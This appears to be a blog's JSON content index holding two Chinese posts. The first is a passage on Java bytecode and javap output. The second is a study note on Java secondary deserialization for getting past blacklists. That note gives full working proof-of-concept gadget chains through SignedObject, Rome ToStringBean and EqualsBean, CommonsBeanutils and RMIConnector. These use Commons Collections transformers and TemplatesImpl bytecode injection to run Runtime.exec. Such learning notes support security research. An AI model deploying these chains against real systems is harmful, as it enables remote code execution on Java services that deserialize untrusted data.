org/example/person.num:I\n   #3 = Methodref          #5.#28         // org/example/person.add:(II)I\n   #4 = Fieldref           #5.#29         // org/example/person.NUM:I\n   #5 = Class              #30            // org/example/person\n   #6 = Class              #31            // java/lang/Object\n   #7 = Utf8               num\n   #8 = Utf8               I\n   #9 = Utf8               NUM\n  #10 = Utf8               &lt;init&gt;\n  #11 = Utf8               ()V\n  #12 = Utf8               Code\n  #13 = Utf8               LineNumberTable\n  #14 = Utf8               LocalVariableTable\n  #15 = Utf8               this\n  #16 = Utf8               Lorg/example/person;\n  #17 = Utf8               func\n  #18 = Utf8               (II)I\n  #19 = Utf8               a\n  #20 = Utf8               b\n  #21 = Utf8               add\n  #22 = Utf8               sub\n  #23 = Utf8               &lt;clinit&gt;\n  #24 = Utf8               SourceFile\n  #25 = Utf8               person.java\n  #26 = NameAndType        #10:#11        // &quot;&lt;init&gt;&quot;:()V\n  #27 = NameAndType        #7:#8          // num:I\n  #28 = NameAndType        #21:#18        // add:(II)I\n  #29 = NameAndType        #9:#8          // NUM:I\n  #30 = Utf8               org/example/person\n  #31 = Utf8               java/lang/Object\n&#123;\n  private int num;\n    descriptor: I\n    flags: ACC_PRIVATE\n\n  public static int NUM;\n    descriptor: I\n    flags: ACC_PUBLIC, ACC_STATIC\n\n  public org.example.person();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=2, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V\n         4: aload_0\n         5: iconst_1\n         6: putfield      #2                  // Field num:I\n         9: return\n      LineNumberTable:\n        line 3: 0\n        line 4: 4\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      10     0  this   Lorg/example/person;\n\n  public int func(int, int);\n    descriptor: (II)I\n    flags: ACC_PUBLIC\n    Code:\n      stack=3, locals=3, args_size=3\n         0: aload_0\n         1: iload_1\n         2: iload_2\n         3: invokevirtual #3                  // Method add:(II)I\n         6: ireturn\n      LineNumberTable:\n        line 8: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       7     0  this   Lorg/example/person;\n            0       7     1     a   I\n            0       7     2     b   I\n\n  public int add(int, int);\n    descriptor: (II)I\n    flags: ACC_PUBLIC\n    Code:\n      stack=2, locals=3, args_size=3\n         0: iload_1\n         1: iload_2\n         2: iadd\n         3: aload_0\n         4: getfield      #2                  // Field num:I\n         7: iadd\n         8: ireturn\n      LineNumberTable:\n        line 12: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       9     0  this   Lorg/example/person;\n            0       9     1     a   I\n            0       9     2     b   I\n\n  public int sub(int, int);\n    descriptor: (II)I\n    flags: ACC_PUBLIC\n    Code:\n      stack=2, locals=3, args_size=3\n         0: iload_1\n         1: iload_2\n         2: isub\n         3: getstatic     #4                  // Field NUM:I\n         6: isub\n         7: ireturn\n      LineNumberTable:\n        line 16: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       8     0  this   Lorg/example/person;\n            0       8     1     a   I\n            0       8     2     b   I\n\n  static &#123;&#125;;\n    descriptor: ()V\n    flags: ACC_STATIC\n    Code:\n      stack=1, locals=0, args_size=0\n         0: bipush        100\n         2: putstatic     #4                  // Field NUM:I\n         5: return\n      LineNumberTable:\n        line 5: 0\n&#125;发现结果还是不同的，javap 的生成感觉可读性更高。两者内容比较是没有问题的。javap -verbose -p person.class的内容直接把常量池中的所有信息都打印出来，我们也能够更好的查找。\n常量池（Constant pool）最显著的就是我们最开始用javap -verbose -p person.class产生的结果中那一堆用#表示的信息。常量池可以理解为 class 文件中的资源仓库，主要存放两大类常量：字面量(Literal),和符号引用(Symbolic References) 。字面量就类似于 java 中的常量概念，如文本字符串，final 常量等。而符号引用则属于编译原理方面的概念，包含以下三种：\n\n类接口的全限定名\n字段的名称和描述符号\n方法的名称和描述\n\n我们截取生成字节码中常量池的部分内容\njavaConstant pool:\n   #1 = Methodref          #6.#26         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V\n   #2 = Fieldref           #5.#27         // org/example/person.num:I\n   #3 = Methodref          #5.#28         // org/example/person.add:(II)I\n   #4 = Fieldref           #5.#29         // org/example/person.NUM:I\n   #5 = Class              #30            // org/example/person\n   #6 = Class              #31            // java/lang/Object\n   #7 = Utf8               num\n   #8 = Utf8               I\n  #10 = Utf8               &lt;init&gt;\n  #11 = Utf8               ()V\n  #26 = NameAndType        #10:#11        // &quot;&lt;init&gt;&quot;:()V\n  #27 = NameAndType        #7:#8\n  #31 = Utf8               java/lang/Object举个例子，来看#1 = Methodref      #6.#26    // java/lang/Object.&quot;&lt;init&gt;&quot;:()V它是一个方法引用（Methodref），指向了第 6 个和第 26 个常量，以此类推看第六个和第 26 个常量的组成，我们能够拼接出后面&#x2F;&#x2F;注释掉的内容java/lang/Object.&quot;&lt;init&gt;&quot;:()V这段其实可以理解为改类的实例构造器说明，由于我们所写的 person 方法没有重写构造方法，所以会调用到父类 Object 的构造方法，该方法的返回值为 V，也就是 void 为空再来第二个常量举例 #2 = Fieldref     #5.#27    // org/example/person.num:I表明他是一个属性引用，由#5 和#27 常量组成，还是类推过去，我们可以得到后续注释一模一样的内容org/example/person.num:I这就是表明该常量#2 代表org/example/包下 person 类的属性 num，并且类型是 Int第三个稍微记录一下org/example/person.add:(II)I 表明该方法引用代表org/example包下的 person 类的 add 方法，该方法由两个参数，并且返回值为 Int这些都是与我们所写的 java 代码中能对应上的，只不过好像初始值没给出，还只是对其变量的一个 ref最后类型的定义，稍微记录一下 对于数组类型，每一位使用一个前置的[字符来描述，如定义一个java.lang.String[][]类型的维数组，将被记录为[[Ljava/lang/String;补充一组访问标识：也就是各块描述中 flag&#x3D;????的内容\n方法表集合 最开始常量池的定义中我们单单只说它是字面量(Literal),和符号引用(Symbolic References)的资源仓库，并不表示类方法的具体内容，而紧接常量池的内容下面就是方法表集合。在字节码中，方法以表的集合形式表现。由于各种工具编码的问题，其实该处方法表的内容每个工具都有可能产生不同的细节，我们拿当前 javap 生成的字节码来分析类比这里就拿一个构造方法来看\njava  public org.example.person();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=2, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V\n         4: aload_0\n         5: iconst_1\n         6: putfield      #2                  // Field num:I\n         9: return\n      LineNumberTable:\n        line 3: 0\n        line 4: 4\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      10     0  this   Lorg/example/person;\n\n//上面是javap的内容，下面是idea的内容\n\n public &lt;init&gt;()V\n   L0\n    LINENUMBER 3 L0\n    ALOAD 0\n    INVOKESPECIAL java/lang/Object.&lt;init&gt; ()V\n   L1\n    LINENUMBER 4 L1\n    ALOAD 0\n    ICONST_1\n    PUTFIELD org/example/person.num : I\n    RETURN\n   L2\n    LOCALVARIABLE this Lorg/example/person; L0 L2 0\n    MAXSTACK = 2\n    MAXLOCALS = 1具体分析：\n\ndescriptor: ()Vdescriptor 主要是对该方法返回值的一个描述\nflags: ACC_PUBLIC表示该方法是公共的，具体还有一些 flag 标识参考上方访问标识。\n\ncode 块具体解析：\n\nstack=2最大操作数栈，JVM 运行时会根据该值来分配栈帧中的操作栈深度，此处为 1（懵，学少了）\nlocals局部变量所需的存储空间，单位为 slot，slot 是虚拟机为局部变量分配内存时所使用的最小单位，为 4 个字节大小。其中，方法参数（实例方法中会固定隐藏一个 this），显示异常处理器参数（trycatch 块中 catch 所定义的异常），方法体中定义的局部变量，都需要使用局部变量表来存放。 locals的大小并不一定等于所有局部变量所占的Slot之和，因为局部变量中的Slot是可以重用的 。（…懵）\nargs_size方法参数的个数，这里实例化方法为什么会有 1 个参数呢？每个实例方法都会隐藏一个 this 参数\nattribute_info这一块呢就是左边是 数字: 操作栈帧的所有内容了，叫做方法体内容。具体分析这些操作指令\n\naload_0：如果是aload_x，则表示从局部变量表中相应位置 x 装载一个对象引用到操作数栈的栈顶。如果是 aload_0,则表示把第零个引用类型本地变量（this 指针）推送到操作数栈顶。invokespecial #1：弹栈，并执行 #1 方法。这里我们首先是进行了一波aload_0，也就是把 this 变量压入了栈，然后 invoke 弹栈，将 this 弹出，并作为参数调用进了初始化方法。iconst_1：将 int 型常量 1 推送至栈顶（留个伏笔，我们 person 不是有两个定义的属性吗）putfield：其实按英文翻译都能猜出来是在干嘛，其实就是为属性赋值。接受一个操作数，这个操作数引用的是运行时常量池的一个字段，比如我们这里#2，那么对应常量池就是 #2 = Fieldref  #5.#27  // org/example/person.num:I，为 person 类的 num 属性值。putfield 会弹出两个栈顶两个值，我们刚才栈顶的值为 this 传入了构造 init 方法，所以 putfield 操作之后执行的就是 this.num&#x3D;1最后一个操作码return，也就是返回空内容，方法执行结束。还有一些 invoke 操作栈帧没有提及：\njavainvokestatic：调用静态方法\ninvokespecial：调用实例构造方法 调用私有方法 调用父类方法\ninvokeinterface：调用接口方法\ninvokevirtual：调用虚方法（除上面三种情况之外的方法，如调用对象方法）\ninvokedynamic：Lambda的原理,即动态调用当然还有很多指令栈帧没有提及，我们之后分析的时候遇到了再记录。\n","slug":"Java字节码初步学习","date":"2024-06-10T05:00:00.000Z","categories_index":"锻刀的理论学习-java字节码","tags_index":"锻刀","author_index":"stoocea"},{"id":"9eef0bafd340d6fd0d85cf5145bacfba","title":"Java二次反序列化学习","content":"前言二次反序列化大多数时候是用来绕过黑名单或者解决不出网的问题，不会作为一条单独且完整的利用链存在，而是作为一个中间节点，用来绕过。二次反序列化一般来说有如下几个常用的利用类\n\nSignedObject\nRMIConnector\nWrapperConnectionPoolDataSource\n\n最后一个在学习 C3P0 链的时候见的很多了，其余两个都没啥印象，一个一个来学习\nSignedObject我们主要看方法 getObject 的内容很正常的反序列化逻辑，创建字节输入流之后，加入对象输入流，之后对对象输入流调用 readObject 方法进行反序列化。序列化数据传入的参数也是可控的，实例化的时候赋值参数即可这么一套下来感觉 SignedObject 是一个完美的二次反序列化媒介，他参数可控，并且能够包含一个 serializeObject，并将其反序列化。现在的问题是如何调用到 SignedObject 的 getObject 方法呢？首先想到的肯定是 fastjson 和 jackson。但是这里的SignedObject 的 getter 方法并不符合 Fastjson 中对于获取 getter 方法的条件。SignedObject 中并没有直接定义 Object 属性值。所以得想另一个—Rome 反序列化\nRometoStringBeanRome 中获取 getter 方法并调用的逻辑有两处地方，ToStringBean 的有参 toString 方法，Equalsbean 的beanEquals 方法在 rome 反序列化中我们就能够获取到类中的 getter 方法。不过也有一点条件：1.必须是 getter 形式 2.必须是无参数的 getter 方法，这两点在具体的方法– 有参 toString 中体现是最终 invoke 前的一段 if 判断，有一个不满足就会直接跳过调用阶段显然我们的 SignedObject 符合要求。所以我们可以直接拼接到 Rome 一条完整的调用链中比如说采用 BadAttributeValueExpException 的这一条（因为确实短），调用栈如下\njavaSignedObject#getObject()\nToStringBean#toString(String)\nToStringBean#toString()\nBadAttributeValueExpException#readObject()拼接之后，SignedObject 中的 this.content 就能够接任何的 readObject 入口的利用链了，比如采用CC6那么我们的 POC 就可以构造出来了。\njavapackage org.example.SignedObjectPOCs;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.syndication.feed.impl.ObjectBean;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.management.BadAttributeValueExpException;\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.security.*;\nimport java.lang.reflect.Field;\nimport java.security.SignedObject;\nimport java.util.Base64;\nimport java.util.Hashtable;\n\npublic class SignedObjectPOC &#123;\n    public static void main(String[] args)throws Exception &#123;\n\n        //获取CC6的入口HashMap\n        CCEXP ccexp=new CCEXP();\n        //SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);\n        kpg.initialize(1024);\n        KeyPair kp = kpg.generateKeyPair();\n        SignedObject signedObject=new SignedObject(ccexp.getPayload(), kp.getPrivate(),Signature.getInstance(&quot;DSA&quot;));\n\n        //Rome\n        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\n        setFieldValue(badAttributeValueExpException,&quot;val&quot;,toStringBean);\n\n        //执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成\n        ByteArrayOutputStream bs = unSerial(badAttributeValueExpException);\n\n        //输出序列化字节码的base64编码\n        Base64Encode(bs);\n\n    &#125;\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n\n&#125;javapackage org.example.SignedObjectPOCs;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CCEXP &#123;\n    public static HashMap getPayload()throws Exception&#123;\n        Transformer[] transformers=new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),\n                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),\n                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)\n        &#125;;\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();\n        /// 先不传入chainedTransformer，之后等hashmap的put方法执行完毕之后再存入，而这里存入ConstantTransformer，是因为后续hashcode的put方法触发链子的时候，最终调用transform方法不会有其他的代码执行影响流程\n        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,new ConstantTransformer(1));\n        //==========================================================================\n        //HashMap&lt;Object,Object&gt; map3=new HashMap&lt;&gt;();\n\n        //===========================初始化 TiedMapEntry以及hashmap\n        TiedMapEntry tiedMapeEntry=new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object,Object&gt; map2= new HashMap&lt;&gt;();\n        map2.put(tiedMapeEntry,&quot;bbb&quot;);\n        lazymap.remove(&quot;aaa&quot;);\n\n\n        //========================================反射写入chainedTransfomer\n        Class c=LazyMap.class;\n        Field factoryField=c.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);\n        factoryField.set(lazymap,chainedTransformer);\n\n        return map2;\n\n    &#125;\n&#125;\n当然，二次反序列化的意义是在于绕过和解决不出网问题，所以最重要的不是这个 POC 生成的 base64 数据（用来直接打的 paylaod），而是如何去利用和拼接我们想要的部分。比如我为什么选择用 Rome 中的BadAttributeValueExpException链来进行 POC 的组成，其中一个原因就是为了绕过 hashMap 或者 hashtable 的限制。\nequalsBeanequalsBean 具体获取 getter 方法并调用的逻辑如下（beanEquals 方法），因为是 euqals 比较方法，所以相较于 toStringBean 的 toString 方法，会有两次 invoke 调用。前置条件是一样的：1.必须是 getter 形式 2.必须是无参数的 getter 方法这里的 bean1 和 bean2 也是可控的。bean1 是初始化 EqualsBean 得到的,但其实作为属性值，它也能够通过反射写入，bean2 是我们调用 beanEquals(obj) 方法时的参数那么这里的思路就是让 bean1 或者 bean2 为 SignedObject。我们可以通过反射写入，让 bean1 直接赋值为 SignedObject。bean2 由于 equalsbean 本身的在构造时有一些逻辑为了满足条件，我们恰好让传入的bean2 变成了SignedObject。这里所涉及的 equalsbean 调用链的部分还有一些逻辑需要好好分析，不过篇幅原因，可以参考之前专门分析 Rome 链的笔记：https://stoocea.github.io/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html#0x06-EqualsBean%E9%93%BEPOC 可以构造为如下形式：\njavapackage org.example.SignedObjectPOCs;\n\nimport com.sun.syndication.feed.impl.EqualsBean;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.example.CCEXP;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.Signature;\nimport java.security.SignedObject;\nimport java.util.*;\n\npublic class SignedObjectPOC2 &#123;\n    public static void main(String[] args) throws Exception&#123;\n\n        //获取CC6的入口HashMap\n        CCEXP ccexp=new CCEXP();\n        //SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);\n        kpg.initialize(1024);\n        KeyPair kp = kpg.generateKeyPair();\n        SignedObject signedObject=new SignedObject(ccexp.getPayloadCC6(), kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));\n\n        //equalsBean链构造内容，这里入口换成hashtable或者hashSet都行\n        EqualsBean bean = new EqualsBean(String.class, &quot;s&quot;);\n        HashMap map1 = new HashMap();\n        HashMap map2 = new HashMap();\n        map1.put(&quot;yy&quot;, bean);\n        map1.put(&quot;zZ&quot;, signedObject);\n        map2.put(&quot;zZ&quot;, bean);\n        map2.put(&quot;yy&quot;, signedObject);\n        //Hashtable hashtable =new Hashtable();\n        HashSet hashSet=new HashSet();\n        hashSet.add(map1);\n        hashSet.add(map2);\n        //hashtable.put(map1,&quot;1&quot;);\n        //hashtable.put(map2,&quot;2&quot;);\n        setFieldValue(bean, &quot;_beanClass&quot;,SignedObject.class);\n        setFieldValue(bean, &quot;_obj&quot;,signedObject);\n        ByteArrayOutputStream baos=unSerial(hashSet);\n        Base64Encode(baos);\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\nCCEXP 的生成内容是一样的还有其他的关于 getter 方法调用的途径，下面分析 commons-beanutils 也就是 CB 链的结合\nCommons-BeanutilsCB 链的 compare 方法中有获取对象属性值的操作，本质还是通过 get 方法获取的，o1 和 o2 都是直接通过传参形式传入的，可控。最终 sink 点在 getSimpleProperty 的 invokeMethod 中\n那么这里还是按照 CC2 和 CC4 的思路，通过优先队列 PriorityQueque 的反序列化入口。但是有一个地方需要注意：最终调用siftDownUsingComparator 到时，我们必须要让 comparator 等于 BeanComparator,并且要将 x 变量赋值为 SignedObject。这里为什么不选择上一个 comparator 呢？c 变量赋值很好实现，我们反射写 queue 即可，但其实我们在 if (right &lt; size 的时候就不满足条件了，这里 size 我们不能通过 add 方法往Queque 里面填元素实现递增，序列化的时候会报错数组越界所以只能够通过第二个 comparator 的 comapare 实现，反射写入 x 值即可。x 怎么赋值进去呢？观察下面的变量传递这里我们反射写入 queue[SignedObject,null] 即可，queue 属性值本身就是一个数组还有一个需要注意的点，beanComparator 的调用流程，最终调用哪个的 getter 取决于property 属性值，所以还要反射写入property=object，之后才能调用到 getObjectPOC 如下：\njavapackage org.example.SignedObjectPOCs;\n\nimport org.apache.commons.beanutils.BeanComparator;\nimport org.apache.commons.collections.comparators.TransformingComparator;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.example.CCEXP;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.Signature;\nimport java.security.SignedObject;\nimport java.util.Base64;\nimport java.util.PriorityQueue;\n\npublic class SignedObjectPOC3 &#123;\n    public static void main(String[] args)throws Exception &#123;\n        //获取CC6的入口HashMap\n        CCEXP ccexp=new CCEXP();\n        //SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);\n        kpg.initialize(1024);\n        KeyPair kp = kpg.generateKeyPair();\n        SignedObject signedObject=new SignedObject(ccexp.getPayloadCC11(), kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));\n\n\n        //使PriorityQueue的comparator变量赋值为beanComparator，siftDownUsingComparator中才会调用到beanComparator.comparator\n        BeanComparator beanComparator =new BeanComparator();\n        PriorityQueue priorityQueue =new PriorityQueue&lt;&gt;(beanComparator);\n        priorityQueue.add(1);\n        priorityQueue.add(2);//执行add操作是为了heapify()执行时的for循环能够进入， size算出来要大于等于1\n\n        setFieldValue(beanComparator,&quot;property&quot;,&quot;object&quot;);\n        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;signedObject,null&#125;);\n        unSerial(priorityQueue);\n\n\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\nRmiConnectorsink 点在 RmiConnector 的 findRMIServerJRMP中，具体的反序列化流是通过传递序列化字符串 base64，然后对其解码，作为 ByteArray 输入流，然后判断是否有 loader，没有 loader 就直接创建对象输入流进行 readObject往上寻找其调用这里要进入 findRMIServerJRMP 就必须满足if (path.startsWith(&quot;/stub/&quot;))的情况。path 是通过 directoryURL 传入的，还是得向上寻找这里就能够找到directoryURL 的具体传值了，我们能够通过反射写入 jmxServiceURL 的 urlPath 任意控制directoryURL，那 if 判断就很好过了，但是 base64 编码的序列化字节码如何传递呢？其实也是通过jmxServiceURL 的 urlPath。我们观察findRMIServerJRMP(path.substring(6,end), environment, isIiop);base64 字符串是通过截取后六位的字符传入的，前六位是什么—-/stub/，所以我们反射写入如的时候只需要在/stub/之后添加我们的 base64 字节码即可。最后用 InvokerTransformer 调用即可，也就是 CC 入口或者其他的 readObject 入口填充，最终流入InvokerTransformer 的时候具体 invoke 的对象是 RMIConnector，方法是 connectPOC 如下：\njavapackage org.example.RmiConnectorPOCs;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.management.remote.JMXServiceURL;\nimport javax.management.remote.rmi.RMIConnector;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RmiConnectorPOC1 &#123;\n    public static void main(String[] args)throws Exception &#123;\n        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);\n        RmipayloadGenerator rmipayloadGenerator=new RmipayloadGenerator();\n        setFieldValue(jmxServiceURL,&quot;urlPath&quot;,&quot;/stub/&quot;+rmipayloadGenerator.getbase64CC11payload());\n        RMIConnector rmiConnector=new RMIConnector(jmxServiceURL,null);\n        InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;,\n                new Class[0], new Object[0]);\n        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();\n        Map&lt;Object,Object&gt; m = LazyMap.decorate(innerMap, transformer);\n        HashMap outerMap = new HashMap();\n        TiedMapEntry tied = new TiedMapEntry(m,rmiConnector);\n        outerMap.put(tied, &quot;t&quot;);\n        innerMap.clear();\n        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;connect&quot;);\n        unSerial(outerMap);\n\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\njavapackage org.example.RmiConnectorPOCs;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RmipayloadGenerator &#123;\n    public static String getbase64CC11payload()throws Exception&#123;\n        //javassist写恶意字节码\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        //CC11攻击流程\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templates, &quot;_name&quot;, &quot;t&quot;);\n        InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;,\n                new Class[0], new Object[0]);\n        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;&gt;();\n        Map&lt;Object,Object&gt; m = LazyMap.decorate(innerMap, transformer);\n        HashMap outerMap = new HashMap();\n        TiedMapEntry tied = new TiedMapEntry(m, templates);\n        outerMap.put(tied, &quot;t&quot;);\n        innerMap.clear();\n        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n        //base64转字符输出\n        ByteArrayOutputStream aos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(aos);\n        oos.writeObject(outerMap);\n        oos.flush();\n        oos.close();\n        return Base64Encode(aos);\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n    private static String Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n//        System.out.println(s);\n//        System.out.println(s.length());\n        return s;\n    &#125;\n\n&#125;稍微修改了一下 CC11 的 hashmap 生成逻辑，不过区别不大了\nwrapperConnectionPoolDataSource具体就不谈了，参考 C3P0 